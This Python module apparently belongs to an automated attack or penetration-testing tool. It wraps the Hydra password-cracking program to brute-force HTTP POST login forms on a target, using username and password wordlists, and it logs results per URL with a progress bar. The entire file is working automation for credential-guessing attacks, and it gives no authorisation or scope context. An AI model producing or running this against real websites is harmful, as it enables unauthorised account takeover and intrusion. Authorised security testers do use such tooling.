import subprocess
import os


def print_hydra_progress(line_count):
    total_lines = 200
    percent = min(int((line_count / total_lines) * 100), 100)
    bar_len = 30
    filled_len = int(bar_len * percent // 100)
    bar = '#' * filled_len + '-' * (bar_len - filled_len)
    print(f"\r[Hydra] [{bar}] {percent}%", end='')

def run_hydra(target, login_forms, out_dir):
    for url in login_forms:
        out_file = os.path.join(out_dir, f"hydra_{url.replace('/', '_')}.txt")
        cmd = [
            "hydra",
            "-L", "wordlists/usernames.txt",
            "-P", "wordlists/passwords.txt",
            target,
            "http-post-form",
            f"{url}:username=^USER^&password=^PASS^:F=Invalid"
        ]
        line_count = 0
        with open(out_file, 'w') as f:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                f.write(line)
                line_count += 1
                print_hydra_progress(line_count)
            process.wait()
        print()
